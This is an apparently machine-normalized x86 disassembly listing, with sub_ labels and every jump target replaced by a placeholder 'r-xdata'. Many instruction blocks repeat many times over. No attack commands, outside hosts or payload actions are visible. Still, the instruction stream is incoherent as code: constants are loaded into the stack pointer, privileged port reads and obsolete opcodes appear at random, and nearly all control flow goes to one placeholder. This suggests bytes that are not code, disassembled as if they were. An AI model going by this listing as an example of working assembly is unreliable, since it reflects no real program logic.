test [ eax + edi * 8 + 0x4253833e ] al
adc [ ebx + 0x42 ] 0x3e
sub_47a63b
sbb eax 0xf0c506f2
sbb [ 0xffffffff92bb06f2 ] 0x7f
add [ esp + eax * 4 + 0x3ef21deb ] 0x551123a5
jmp r-xdata
int 0x58
jpo r-xdata
jpo r-xdata
xchg edx eax
sbb eax 0xeb848491
jmp r-xdata
xchg edx eax
test al 0x79
jpo r-xdata
add [ ebp + ebp - 0x75c0fbd ] 0xffffff80
test [ edx + 0x7b7b5a75 ] dl
sub eax 0xa0483f11
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
jne r-xdata
push ebp
pushfd
test [ ecx + edx - 0x28127b85 ] al
sti
jns r-xdata
dec ebx
jmp r-xdata
jmp r-xdata
r-xdata
jpo r-xdata
test [ edx + edx * 4 - 0x7b7b6147 ] al
xchg edx eax
push ebp
jpo r-xdata
jpo r-xdata
add esi [ esi + 0x7b ]
int3
xchg edx eax
mov [ edx - 0x14147b7c ] eax
jmp r-xdata
push cs
jae r-xdata
dec edi
outsd
jpo r-xdata
test [ edi ] cl
pop edi
pop edi
je r-xdata
jmp r-xdata
sbb eax 0x239b3ef2
adc [ ecx ] ebx
sbb eax 0x23993ef2
adc [ edx ] ebx
xchg edx eax
push ebp
and eax 0x269ef020
mov eax 0xebebebeb
jmp r-xdata
jpo r-xdata
jmp r-xdata
push es
jmp r-xdata
sub eax [ esi + ecx + 0x6af39373 ]
jpo r-xdata
je r-xdata
mov esp 0x9384849e
or al 0xa2
jpo r-xdata
adc [ ebx - 0x7c ] edi
in eax dx
xlat
jbe r-xdata
idiv [ esi ]
sub [ edx - 0x7b7b7d77 ] dl
sub [ 0xffffffffa0483f11 ] ch
jmp r-xdata
sub [ edx - 0x7b7b7d77 ] dl
jmp r-xdata
je r-xdata
and ah [ edx ]
mov dl 0xb8
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
xor [ esp + eax * 4 + 0x20243b84 ] ebx
mov dl 0xb8
jmp r-xdata
ja r-xdata
adc [ ebx + 0x42 ] 0x3e
xchg edx eax
xchg ebp eax
test [ eax + edi * 8 + 0x4253833e ] al
sub_47a671
mov es [ si - 0xf7c ]
push cs
jae r-xdata
dec edi
outsd
jpo r-xdata
jmp r-xdata
push es
jmp r-xdata
sub eax [ esi + ecx + 0x6af39373 ]
jpo r-xdata
sub [ edx - 0x7b7b7d77 ] dl
xchg edx eax
jne r-xdata
push ebp
pushfd
test [ ecx + edx - 0x28127b85 ] al
jmp r-xdata
je r-xdata
and ah [ edx ]
mov dl 0xb8
jmp r-xdata
sti
jns r-xdata
r-xdata
jpo r-xdata
test [ edx + edx * 4 - 0x7b7b6147 ] al
xchg edx eax
push ebp
jpo r-xdata
jpo r-xdata
jmp r-xdata
xor [ esp + eax * 4 + 0x20243b84 ] ebx
mov dl 0xb8
jmp r-xdata
ja r-xdata
add esi [ esi + 0x7b ]
jpo r-xdata
test [ edi ] cl
pop edi
pop edi
je r-xdata
jmp r-xdata
push ebp
sbb eax 0x239b3ef2
adc [ ecx ] ebx
sbb eax 0x23993ef2
adc [ edx ] ebx
xchg edx eax
and eax 0x269ef020
mov eax 0xebebebeb
jmp r-xdata
xchg edx eax
xchg ebp eax
test [ eax + edi * 8 + 0x4253833e ] al
jmp r-xdata
int 0x58
jpo r-xdata
add [ ebp + ebp - 0x75c0fbd ] 0xffffff80
test [ edx + 0x7b7b5a75 ] dl
jmp r-xdata
sub eax 0xa0483f11
je r-xdata
mov esp 0x9384849e
or al 0xa2
jpo r-xdata
adc [ ebx - 0x7c ] edi
in eax dx
xlat
xchg edx eax
sbb eax 0xeb848491
jmp r-xdata
xchg edx eax
test al 0x79
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
dec ebx
jmp r-xdata
jmp r-xdata
int3
xchg edx eax
mov [ edx - 0x14147b7c ] eax
jmp r-xdata
jpo r-xdata
jbe r-xdata
idiv [ esi ]
sub [ edx - 0x7b7b7d77 ] dl
sub [ 0xffffffffa0483f11 ] ch
jmp r-xdata
jpo r-xdata
adc [ ebx + 0x42 ] 0x3e
sub_47a690
add edi [ ecx + 0x7b ]
xchg edx eax
mov al 0x74
jpo r-xdata
adc [ ecx ] 0x1f
sub al 0x84
in eax dx

jmp r-xdata
je r-xdata
xchg edx eax
jne r-xdata
push ebp
pushfd
test [ ecx + edx - 0x28127b85 ] al
r-xdata
jpo r-xdata
test [ edx + edx * 4 - 0x7b7b6147 ] al
xchg edx eax
push ebp
jpo r-xdata
jpo r-xdata
push cs
jae r-xdata
dec edi
outsd
jpo r-xdata
test [ edi ] cl
pop edi
pop edi
jmp r-xdata
push ebp
sbb eax 0x239b3ef2
adc [ ecx ] ebx
sbb eax 0x23993ef2
adc [ edx ] ebx
xchg edx eax
and eax 0x269ef020
mov eax 0xebebebeb
jmp r-xdata
jmp r-xdata
push es
jmp r-xdata
sub eax [ esi + ecx + 0x6af39373 ]
jpo r-xdata
je r-xdata
mov esp 0x9384849e
or al 0xa2
jmp r-xdata
int 0x58
jpo r-xdata
jpo r-xdata
adc [ ebx - 0x7c ] edi
in eax dx
xlat
sub [ edx - 0x7b7b7d77 ] dl
jmp r-xdata
je r-xdata
and ah [ edx ]
mov dl 0xb8
jmp r-xdata
jpo r-xdata
xchg edx eax
sbb eax 0xeb848491
jmp r-xdata
xchg edx eax
test al 0x79
jpo r-xdata
sti
jns r-xdata
jmp r-xdata
xor [ esp + eax * 4 + 0x20243b84 ] ebx
mov dl 0xb8
jmp r-xdata
ja r-xdata
add [ ebp + ebp - 0x75c0fbd ] 0xffffff80
test [ edx + 0x7b7b5a75 ] dl
jmp r-xdata
sub eax 0xa0483f11
jmp r-xdata
jmp r-xdata
jmp r-xdata
add esi [ esi + 0x7b ]
xchg edx eax
xchg ebp eax
test [ eax + edi * 8 + 0x4253833e ] al
dec ebx
jmp r-xdata
jmp r-xdata
int3
xchg edx eax
mov [ edx - 0x14147b7c ] eax
jmp r-xdata
jpo r-xdata
jbe r-xdata
idiv [ esi ]
sub [ edx - 0x7b7b7d77 ] dl
sub [ 0xffffffffa0483f11 ] ch
jmp r-xdata
jpo r-xdata
adc [ ebx + 0x42 ] 0x3e
sub_47a6bc
scasb [ edi ]
pop edi
jpo r-xdata
jpo r-xdata
clc
mov ebx 0x4bcc7479
xchg edx eax
xchg ebp eax
test [ eax + edi * 8 + 0x4253833e ] al
js j_sub_47a7df
inc al
nop
test [ eax + ecx * 2 - 0x14144745 ] al
jmp r-xdata
pop edi
pop edi
je r-xdata
mul [ 0x72cb927f ]
jpo r-xdata
jmp r-xdata
mov ebx 0x93bdf02b
div [ edi - 0x40077b7c ]
ja r-xdata
je r-xdata
test bl ch
xchg edx eax
push ebx
mov es [ esp + eax * 4 - 0x14141415 ]
jmp r-xdata
int3
aas
pop edi
rcl [ eax - 0x44b77b7c ] 0xb8
jmp r-xdata
cmp [ edi ] bl
sub ebx [ 0x1d5538f0 ]
pop ebx
xchg edx eax
les esi [ eax + 0x7b ]
jpo r-xdata
sub esi eax
jmp r-xdata
int3
mov ebp 0x84b7f793
test al bh
mov edi 0x5f3ff277
sub_47a77e
xchg edx eax
mov bl [ edx + 0x7b ]
jpo r-xdata
test [ ebx + ebp * 8 - 0x7b71ac6e ] al
test bl ch
jmp r-xdata
jmp r-xdata
test bl dh
mov esi ebx
fwait
xchg edx eax
jpo r-xdata
jmp r-xdata
jmp r-xdata
test [ ebx + edi - 0x474ddfdc ] al
jmp r-xdata
sub_47a787
jmp r-xdata
mov es [ esp + eax * 4 - 0x14141415 ]
jmp r-xdata
cmp [ edi ] bl
sub ebx [ 0x1d5538f0 ]
js j_sub_47a7df
pop edi
pop edi
je r-xdata
jmp r-xdata
mov ebx 0x93bdf02b
div [ edi - 0x40077b7c ]
ja r-xdata
test bl ch
xchg edx eax
push ebx
int3
aas
pop edi
pop ebx
xchg edx eax
les esi [ eax + 0x7b ]
jpo r-xdata
sub esi eax
jmp r-xdata
mov ebp 0x84b7f793
test al bh
mov edi 0x5f3ff277
sub_47a7df
test bl ch
jmp r-xdata
jmp r-xdata
xchg ebx eax
div [ edi - 0x40077b7c ]
ja r-xdata
int3
aas
pop edi
pop ebx
xchg edx eax
les esi [ eax + 0x7b ]
jpo r-xdata
sub esi eax
jmp r-xdata
mov ebp 0x84b7f793
test al bh
mov edi 0x5f3ff277
sub_47a81e
push ds
xchg [ ebx - 0x6e ] edi
inc ebp
pop ecx
jpo r-xdata
sbb eax 0x927b43f8
jmp r-xdata
lodsb [ esi ]
test [ ebx + ebp * 8 - 0x9d2d215 ] al
jpo r-xdata
mov ebp 0x84b7f793
test al bh
mov edi 0x5f3ff277
pop ebx
xchg edx eax
les esi [ eax + 0x7b ]
jpo r-xdata

xchg edx eax
test eax 0xeb7b7b78
jmp r-xdata
sub esi eax
jmp r-xdata
pop esi
jb r-xdata
test [ ebx + ebp * 8 + 0x7b43f81d ] al
xchg edx eax
sub_47a828
pop edi
mov dl 0x84
test bl ch
jmp r-xdata
or [ esi ] bl
jpo r-xdata
jmp r-xdata
jmp r-xdata
sub edi [ ebx + edi * 2 + 0x7b7a7b79 ]
or [ 0x48833ebc ] ebx
dec ecx
mov ebp 0x847b813e
sub eax 0x63e69233
jpo r-xdata
idiv dh
jns r-xdata
test [ esi ] bh
jpe r-xdata
jpo r-xdata
mov ebx 0xa68cff74
cmp eax 0x3e
xchg [ ebx - 0x6e ] edx
scasd [ edi ]
movsb [ edi ] [ esi ]
test [ ebx + ebp * 8 - 0x6d74f17c ] al
sub al 0xb7
test [ esp + eax * 4 + 0x7b7bc3ed ] al
test [ esi ] cl
xchg ebx eax
add [ ds : esp + ebp - 0x5c3b6dd1 ] 0xffffff84
je r-xdata
dec [ ebx - 0x6d8484a0 ]
mov esp [ eax + 0x7b ]
jpo r-xdata
jmp r-xdata
jae r-xdata
movsd [ edi ] [ esi ]
xchg esi eax
test [ esp - 0x1447dfdb ] al
jmp r-xdata
mov eax [ esp + eax * 4 + 0x742ebeb ]
r-xdata
mov esp [ ecx - 0x14147b7c ]
jmp r-xdata
jns r-xdata
imul edi [ 0x1692a9fe ] 0x70
jpo r-xdata
daa
arpl [ ebx + 0x7b ] di
jmp r-xdata
jmp r-xdata
pop edi
pop edi
pop ebx
xchg edx eax
xor [ ebx - 0x14147b7c ] eax
jmp r-xdata
cmp ecx [ ebx - 0x14147b7c ]
inc edx
pop es
jpo r-xdata
jmp r-xdata
and eax 0xebebb8b2
jmp r-xdata
imul edi eax 0xffffffb9
jg r-xdata
test [ eax + esi * 8 - 0x794a0d1 ] al
mov ecx 0x5ffff67f
jmp r-xdata
[ edi - 0x15 ]
jpo r-xdata
scasb [ edi ]
lea eax [ esp + eax * 4 - 0x14141415 ]
sbb eax 0x23ab3ef2
adc [ esi ] ebx
xchg edx eax
retn
jmp r-xdata
jge r-xdata
sub eax 0x2ffef62d
add [ esp + eax * 4 + 0x2c842d2b ] 0x2b
jpo r-xdata
jmp r-xdata
test [ eax + 0x7b ] ah
jpo r-xdata
jg r-xdata
jmp r-xdata
and al 0x25
test [ ebx + ebp + 0x2b2c842d ] al
mov bh 0x77
jpo r-xdata
mov dl 0xb8
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
dec eax
test eax 0xe8cbaf0
jmp r-xdata
jmp r-xdata
test bl ch
add [ esp + ebp - 0x5c3b6dd1 ] 0xffffff84
jmp r-xdata
sub al 0x67
sub [ edx + 0x7b7b6084 ] dl
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
sub_47a854
sub edi [ esi + edi + 0x1e080e8f ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
sub edi [ ebx + edi * 2 + 0x7b7a7b79 ]
or [ 0x48833ebc ] ebx
dec ecx
mov ebp 0x847b813e
sub eax 0x63e69233
jpo r-xdata
idiv dh
jns r-xdata
test [ esi ] bh
jpe r-xdata
jpo r-xdata
mov ebx 0xa68cff74
cmp eax 0x3e
xchg [ ebx - 0x6e ] edx
scasd [ edi ]
movsb [ edi ] [ esi ]
test [ ebx + ebp * 8 - 0x6d74f17c ] al
sub al 0xb7
test [ esp + eax * 4 + 0x7b7bc3ed ] al
test [ esi ] cl
xchg ebx eax
add [ ds : esp + ebp - 0x5c3b6dd1 ] 0xffffff84
je r-xdata
dec [ ebx - 0x6d8484a0 ]
mov esp [ eax + 0x7b ]
jpo r-xdata
jmp r-xdata
jae r-xdata
movsd [ edi ] [ esi ]
xchg esi eax
test [ esp - 0x1447dfdb ] al
jmp r-xdata
mov eax [ esp + eax * 4 + 0x742ebeb ]
r-xdata
mov esp [ ecx - 0x14147b7c ]
jmp r-xdata
jns r-xdata
imul edi [ 0x1692a9fe ] 0x70
jpo r-xdata
daa
arpl [ ebx + 0x7b ] di
jmp r-xdata
jmp r-xdata
pop edi
pop edi
pop ebx
xchg edx eax
xor [ ebx - 0x14147b7c ] eax
jmp r-xdata
cmp ecx [ ebx - 0x14147b7c ]
inc edx
pop es
jpo r-xdata
jmp r-xdata
and eax 0xebebb8b2
jmp r-xdata
imul edi eax 0xffffffb9
jg r-xdata
test [ eax + esi * 8 - 0x794a0d1 ] al
mov ecx 0x5ffff67f
jmp r-xdata
[ edi - 0x15 ]
jpo r-xdata
scasb [ edi ]
lea eax [ esp + eax * 4 - 0x14141415 ]
sbb eax 0x23ab3ef2
adc [ esi ] ebx
xchg edx eax
retn
jmp r-xdata
jge r-xdata
sub eax 0x2ffef62d
add [ esp + eax * 4 + 0x2c842d2b ] 0x2b
jpo r-xdata
jmp r-xdata
test [ eax + 0x7b ] ah
jpo r-xdata
jg r-xdata
jmp r-xdata
and al 0x25
test [ ebx + ebp + 0x2b2c842d ] al
mov bh 0x77
jpo r-xdata
mov dl 0xb8
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
dec eax
test eax 0xe8cbaf0
jmp r-xdata
jmp r-xdata
test bl ch
add [ esp + ebp - 0x5c3b6dd1 ] 0xffffff84
jmp r-xdata
sub al 0x67
sub [ edx + 0x7b7b6084 ] dl
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
sub_47a895
test bl cl
jg r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp sub_47a903
xchg edx eax
adc ch [ esp + eax * 4 - 0x7e2147c ]
inc ebx
jpo r-xdata
jpo r-xdata
jmp r-xdata
pop esi
jb r-xdata
jmp sub_47a955
jpo r-xdata
jpo r-xdata
lodsb [ esi ]
test [ ebx + ebp * 8 - 0x9d2d215 ] al
jpo r-xdata
test [ esi ] bh
jpo r-xdata
fst [ ebx - 0x14147b7c ]
jmp j_sub_47a7df#2
xchg edx eax

xchg edx eax
test eax 0xeb7b7b78
jmp r-xdata
jpo r-xdata
mov ebx 0xa68cff74
push eax
mov ah 0x92
push cs
test [ ebx + ebp * 8 + 0x7b43f81d ] al
xchg edx eax
je r-xdata
jns r-xdata
dec [ ebx - 0x6d8484a0 ]
mov esp [ eax + 0x7b ]
jpo r-xdata
jpe r-xdata
jmp r-xdata
jae r-xdata
movsd [ edi ] [ esi ]
xchg esi eax
test [ esp - 0x1447dfdb ] al
jmp r-xdata
cmp eax 0x3e
xchg [ ebx - 0x6e ] edx
scasd [ edi ]
movsb [ edi ] [ esi ]
test [ ebx + ebp * 8 - 0x6d74f17c ] al
sub al 0xb7
test [ esp + eax * 4 + 0x7b7bc3ed ] al
xchg ebx eax
add [ ds : esp + ebp - 0x5c3b6dd1 ] 0xffffff84
test [ esi ] cl
mov eax [ esp + eax * 4 + 0x742ebeb ]
r-xdata
mov esp [ ecx - 0x14147b7c ]
jmp r-xdata
jns r-xdata
imul edi [ 0x1692a9fe ] 0x70
jpo r-xdata
daa
arpl [ ebx + 0x7b ] di
jmp r-xdata
jmp r-xdata
pop edi
pop edi
pop ebx
xchg edx eax
xor [ ebx - 0x14147b7c ] eax
jmp r-xdata
cmp ecx [ ebx - 0x14147b7c ]
inc edx
pop es
jpo r-xdata
jmp r-xdata
and eax 0xebebb8b2
jmp r-xdata
imul edi eax 0xffffffb9
jg r-xdata
test [ eax + esi * 8 - 0x794a0d1 ] al
mov ecx 0x5ffff67f
jmp r-xdata
[ edi - 0x15 ]
jpo r-xdata
scasb [ edi ]
lea eax [ esp + eax * 4 - 0x14141415 ]
sbb eax 0x23ab3ef2
adc [ esi ] ebx
xchg edx eax
retn
jmp r-xdata
jge r-xdata
sub eax 0x2ffef62d
add [ esp + eax * 4 + 0x2c842d2b ] 0x2b
jpo r-xdata
jmp r-xdata
test [ eax + 0x7b ] ah
jpo r-xdata
jg r-xdata
jmp r-xdata
and al 0x25
test [ ebx + ebp + 0x2b2c842d ] al
mov bh 0x77
jpo r-xdata
mov dl 0xb8
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
dec eax
test eax 0xe8cbaf0
jmp r-xdata
jmp r-xdata
test bl ch
add [ esp + ebp - 0x5c3b6dd1 ] 0xffffff84
jmp r-xdata
sub al 0x67
sub [ edx + 0x7b7b6084 ] dl
jmp r-xdata
jmp r-xdata
jmp r-xdata
sub_47a8b6
push cs
jae r-xdata
std
fwait
jpo r-xdata
push cs
xchg [ esi + ecx + 0x672c849f ] eax
sub [ edx + 0x7b7b6084 ] dl
jmp r-xdata
lahf
test [ edi ] ch
jpo r-xdata
jmp r-xdata
jpo r-xdata
in al 0x89
jmp r-xdata
jo r-xdata
imul edx [ edx - 0x7b7b70f0 ] 0xffffffeb
jmp r-xdata
push cs
jae r-xdata
jpo r-xdata
xchg edx eax
test [ eax + edi * 8 - 0x20d9441 ] al
lahf
jpo r-xdata
jmp r-xdata
sub al 0x67
jge r-xdata
jpo r-xdata
clc
mov edi 0x9ffdf26b
sub esi eax
jmp r-xdata
xchg ebx eax
div [ edi - 0x40077b7c ]
ja r-xdata
test [ eax + 0x7b ] ah
jpo r-xdata
jg r-xdata
mov ebp 0x84b7f793
test al bh
mov edi 0x5f3ff277
int3
pop ebx
xchg edx eax
les esi [ eax + 0x7b ]
aas
pop edi
jmp r-xdata
jmp r-xdata
jmp r-xdata
dec eax
test eax 0xe8cbaf0
jmp r-xdata
add [ esp + ebp - 0x5c3b6dd1 ] 0xffffff84
jmp r-xdata
jpo r-xdata
jmp r-xdata
jns r-xdata
scasb [ edi ]
lea eax [ esp + eax * 4 - 0x14141415 ]
sbb eax 0x23ab3ef2
adc [ esi ] ebx
xchg edx eax
retn
jmp r-xdata
test [ esi ] bh
jpe r-xdata
jmp r-xdata
jpo r-xdata
mov ebx 0xa68cff74
cmp eax 0x3e
xchg [ ebx - 0x6e ] edx
scasd [ edi ]
movsb [ edi ] [ esi ]
test [ ebx + ebp * 8 - 0x6d74f17c ] al
sub al 0xb7
test [ esp + eax * 4 + 0x7b7bc3ed ] al
test bl ch
test [ esi ] cl
xchg ebx eax
add [ ds : esp + ebp - 0x5c3b6dd1 ] 0xffffff84
mov dl 0xb8
jmp r-xdata
je r-xdata
jmp r-xdata
dec [ ebx - 0x6d8484a0 ]
mov esp [ eax + 0x7b ]
jpo r-xdata
jmp r-xdata
jae r-xdata
movsd [ edi ] [ esi ]
xchg esi eax
test [ esp - 0x1447dfdb ] al
jmp r-xdata
mov eax [ esp + eax * 4 + 0x742ebeb ]
r-xdata
mov esp [ ecx - 0x14147b7c ]
jmp r-xdata
jns r-xdata
imul edi [ 0x1692a9fe ] 0x70
jpo r-xdata
daa
arpl [ ebx + 0x7b ] di
jmp r-xdata
jmp r-xdata
pop edi
pop edi
pop ebx
xchg edx eax
xor [ ebx - 0x14147b7c ] eax
jmp r-xdata
cmp ecx [ ebx - 0x14147b7c ]
inc edx
pop es
and eax 0xebebb8b2
jmp r-xdata
imul edi eax 0xffffffb9
jg r-xdata
test [ eax + esi * 8 - 0x794a0d1 ] al
mov ecx 0x5ffff67f
jmp r-xdata
[ edi - 0x15 ]
jpo r-xdata
sub eax 0x2ffef62d
add [ esp + eax * 4 + 0x2c842d2b ] 0x2b
jpo r-xdata
and al 0x25
test [ ebx + ebp + 0x2b2c842d ] al
mov bh 0x77
jpo r-xdata
jmp r-xdata
sub_47a903
jmp r-xdata
jpe r-xdata
cmp eax 0x3e
xchg [ ebx - 0x6e ] edx
scasd [ edi ]
movsb [ edi ] [ esi ]
test [ ebx + ebp * 8 - 0x6d74f17c ] al
sub al 0xb7
test [ esp + eax * 4 + 0x7b7bc3ed ] al
test [ esi ] cl
xchg ebx eax
add [ ds : esp + ebp - 0x5c3b6dd1 ] 0xffffff84
jpo r-xdata
mov ebx 0xa68cff74
jns r-xdata
je r-xdata
test [ esi ] bh
dec [ ebx - 0x6d8484a0 ]
mov esp [ eax + 0x7b ]
jpo r-xdata
jmp r-xdata
jae r-xdata
movsd [ edi ] [ esi ]
xchg esi eax
test [ esp - 0x1447dfdb ] al
jmp r-xdata
mov eax [ esp + eax * 4 + 0x742ebeb ]
r-xdata
mov esp [ ecx - 0x14147b7c ]
jmp r-xdata
jns r-xdata
imul edi [ 0x1692a9fe ] 0x70
jpo r-xdata
daa
arpl [ ebx + 0x7b ] di
jmp r-xdata
jmp r-xdata
pop edi
pop edi
pop ebx
xchg edx eax
xor [ ebx - 0x14147b7c ] eax
jmp r-xdata
cmp ecx [ ebx - 0x14147b7c ]
inc edx
pop es
jpo r-xdata
jmp r-xdata
and eax 0xebebb8b2
jmp r-xdata
imul edi eax 0xffffffb9
jg r-xdata
test [ eax + esi * 8 - 0x794a0d1 ] al
mov ecx 0x5ffff67f
jmp r-xdata
[ edi - 0x15 ]
jpo r-xdata
scasb [ edi ]
lea eax [ esp + eax * 4 - 0x14141415 ]
sbb eax 0x23ab3ef2
adc [ esi ] ebx
xchg edx eax
retn
jmp r-xdata
jge r-xdata
sub eax 0x2ffef62d
add [ esp + eax * 4 + 0x2c842d2b ] 0x2b
jpo r-xdata
jmp r-xdata
test [ eax + 0x7b ] ah
jpo r-xdata
jg r-xdata
jmp r-xdata
and al 0x25
test [ ebx + ebp + 0x2b2c842d ] al
mov bh 0x77
jpo r-xdata
mov dl 0xb8
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
dec eax
test eax 0xe8cbaf0
jmp r-xdata
jmp r-xdata
test bl ch
add [ esp + ebp - 0x5c3b6dd1 ] 0xffffff84
jmp r-xdata
sub al 0x67
sub [ edx + 0x7b7b6084 ] dl
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
sub_47a919
test [ esi ] cl
lahf
[ es : esi ] [ edi ]
test [ ebx ] ch
xchg edx eax
sub [ esp + eax * 4 + 0x2debeb84 ] ch
sub eax 0x802ffef6
jmp r-xdata
jmp r-xdata
jmp r-xdata
jns r-xdata
test [ esi ] bh
jpe r-xdata
jpo r-xdata
mov ebx 0xa68cff74
cmp eax 0x3e
xchg [ ebx - 0x6e ] edx
scasd [ edi ]
movsb [ edi ] [ esi ]
test [ ebx + ebp * 8 - 0x6d74f17c ] al
sub al 0xb7
test [ esp + eax * 4 + 0x7b7bc3ed ] al
test [ esi ] cl
xchg ebx eax
add [ ds : esp + ebp - 0x5c3b6dd1 ] 0xffffff84
je r-xdata
dec [ ebx - 0x6d8484a0 ]
mov esp [ eax + 0x7b ]
jpo r-xdata
jmp r-xdata
jae r-xdata
movsd [ edi ] [ esi ]
xchg esi eax
test [ esp - 0x1447dfdb ] al
jmp r-xdata
mov eax [ esp + eax * 4 + 0x742ebeb ]
r-xdata
mov esp [ ecx - 0x14147b7c ]
jmp r-xdata
jns r-xdata
imul edi [ 0x1692a9fe ] 0x70
jpo r-xdata
daa
arpl [ ebx + 0x7b ] di
jmp r-xdata
jmp r-xdata
pop edi
pop edi
pop ebx
xchg edx eax
xor [ ebx - 0x14147b7c ] eax
jmp r-xdata
cmp ecx [ ebx - 0x14147b7c ]
inc edx
pop es
jpo r-xdata
jmp r-xdata
and eax 0xebebb8b2
jmp r-xdata
imul edi eax 0xffffffb9
jg r-xdata
test [ eax + esi * 8 - 0x794a0d1 ] al
mov ecx 0x5ffff67f
jmp r-xdata
[ edi - 0x15 ]
jpo r-xdata
scasb [ edi ]
lea eax [ esp + eax * 4 - 0x14141415 ]
sbb eax 0x23ab3ef2
adc [ esi ] ebx
xchg edx eax
retn
jmp r-xdata
jge r-xdata
and al 0x25
sub eax 0x2ffef62d
add [ esp + eax * 4 + 0x2c842d2b ] 0x2b
jpo r-xdata
jmp r-xdata
test [ eax + 0x7b ] ah
jpo r-xdata
jg r-xdata
test [ ebx + ebp + 0x2b2c842d ] al
mov bh 0x77
jpo r-xdata
mov dl 0xb8
jmp r-xdata
jmp r-xdata
jmp r-xdata
dec eax
test eax 0xe8cbaf0
jmp r-xdata
jmp r-xdata
test bl ch
add [ esp + ebp - 0x5c3b6dd1 ] 0xffffff84
sub al 0x67
sub [ edx + 0x7b7b6084 ] dl
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
sub_47a93d
jmp r-xdata
sub eax 0x802ffef6
jmp r-xdata
jmp r-xdata
jmp r-xdata
jns r-xdata
test [ esi ] bh
jpe r-xdata
jpo r-xdata
mov ebx 0xa68cff74
cmp eax 0x3e
xchg [ ebx - 0x6e ] edx
scasd [ edi ]
movsb [ edi ] [ esi ]
test [ ebx + ebp * 8 - 0x6d74f17c ] al
sub al 0xb7
test [ esp + eax * 4 + 0x7b7bc3ed ] al
test [ esi ] cl
xchg ebx eax
add [ ds : esp + ebp - 0x5c3b6dd1 ] 0xffffff84
je r-xdata
dec [ ebx - 0x6d8484a0 ]
mov esp [ eax + 0x7b ]
jpo r-xdata
jmp r-xdata
jae r-xdata
movsd [ edi ] [ esi ]
xchg esi eax
test [ esp - 0x1447dfdb ] al
jmp r-xdata
mov eax [ esp + eax * 4 + 0x742ebeb ]
r-xdata
mov esp [ ecx - 0x14147b7c ]
jmp r-xdata
jns r-xdata
imul edi [ 0x1692a9fe ] 0x70
jpo r-xdata
daa
arpl [ ebx + 0x7b ] di
jmp r-xdata
jmp r-xdata
pop edi
pop edi
pop ebx
xchg edx eax
xor [ ebx - 0x14147b7c ] eax
jmp r-xdata
cmp ecx [ ebx - 0x14147b7c ]
inc edx
pop es
jpo r-xdata
jmp r-xdata
and eax 0xebebb8b2
jmp r-xdata
imul edi eax 0xffffffb9
jg r-xdata
test [ eax + esi * 8 - 0x794a0d1 ] al
mov ecx 0x5ffff67f
jmp r-xdata
[ edi - 0x15 ]
jpo r-xdata
scasb [ edi ]
lea eax [ esp + eax * 4 - 0x14141415 ]
sbb eax 0x23ab3ef2
adc [ esi ] ebx
xchg edx eax
retn
jmp r-xdata
jge r-xdata
and al 0x25
sub eax 0x2ffef62d
add [ esp + eax * 4 + 0x2c842d2b ] 0x2b
jpo r-xdata
jmp r-xdata
test [ eax + 0x7b ] ah
jpo r-xdata
jg r-xdata
test [ ebx + ebp + 0x2b2c842d ] al
mov bh 0x77
jpo r-xdata
mov dl 0xb8
jmp r-xdata
jmp r-xdata
jmp r-xdata
dec eax
test eax 0xe8cbaf0
jmp r-xdata
jmp r-xdata
test bl ch
add [ esp + ebp - 0x5c3b6dd1 ] 0xffffff84
sub al 0x67
sub [ edx + 0x7b7b6084 ] dl
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
sub_47a94c
jmp r-xdata
mov eax 0xebebebeb
jmp r-xdata
idiv dh
das
jmp r-xdata
jmp r-xdata
jmp r-xdata
jns r-xdata
test [ esi ] bh
jpe r-xdata
jpo r-xdata
mov ebx 0xa68cff74
cmp eax 0x3e
xchg [ ebx - 0x6e ] edx
scasd [ edi ]
movsb [ edi ] [ esi ]
test [ ebx + ebp * 8 - 0x6d74f17c ] al
sub al 0xb7
test [ esp + eax * 4 + 0x7b7bc3ed ] al
test [ esi ] cl
xchg ebx eax
add [ ds : esp + ebp - 0x5c3b6dd1 ] 0xffffff84
je r-xdata
dec [ ebx - 0x6d8484a0 ]
mov esp [ eax + 0x7b ]
jpo r-xdata
jmp r-xdata
jae r-xdata
movsd [ edi ] [ esi ]
xchg esi eax
test [ esp - 0x1447dfdb ] al
jmp r-xdata
mov eax [ esp + eax * 4 + 0x742ebeb ]
r-xdata
mov esp [ ecx - 0x14147b7c ]
jmp r-xdata
jns r-xdata
imul edi [ 0x1692a9fe ] 0x70
jpo r-xdata
daa
arpl [ ebx + 0x7b ] di
jmp r-xdata
jmp r-xdata
pop edi
pop edi
pop ebx
xchg edx eax
xor [ ebx - 0x14147b7c ] eax
jmp r-xdata
cmp ecx [ ebx - 0x14147b7c ]
inc edx
pop es
jpo r-xdata
jmp r-xdata
and eax 0xebebb8b2
jmp r-xdata
imul edi eax 0xffffffb9
jg r-xdata
test [ eax + esi * 8 - 0x794a0d1 ] al
mov ecx 0x5ffff67f
jmp r-xdata
[ edi - 0x15 ]
jpo r-xdata
scasb [ edi ]
lea eax [ esp + eax * 4 - 0x14141415 ]
sbb eax 0x23ab3ef2
adc [ esi ] ebx
xchg edx eax
retn
jmp r-xdata
jge r-xdata
add [ esp + eax * 4 + 0x2c842d2b ] 0x2b
sub eax 0x2ffef62d
jpo r-xdata
jmp r-xdata
test [ eax + 0x7b ] ah
jpo r-xdata
jg r-xdata
and al 0x25
test [ ebx + ebp + 0x2b2c842d ] al
mov bh 0x77
jpo r-xdata
mov dl 0xb8
jmp r-xdata
jmp r-xdata
jmp r-xdata
dec eax
test eax 0xe8cbaf0
jmp r-xdata
jmp r-xdata
test bl ch
add [ esp + ebp - 0x5c3b6dd1 ] 0xffffff84
sub al 0x67
sub [ edx + 0x7b7b6084 ] dl
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
sub_47a955
scasd [ edi ]
xchg [ esp + eax * 4 + 0x7b649192 ] al
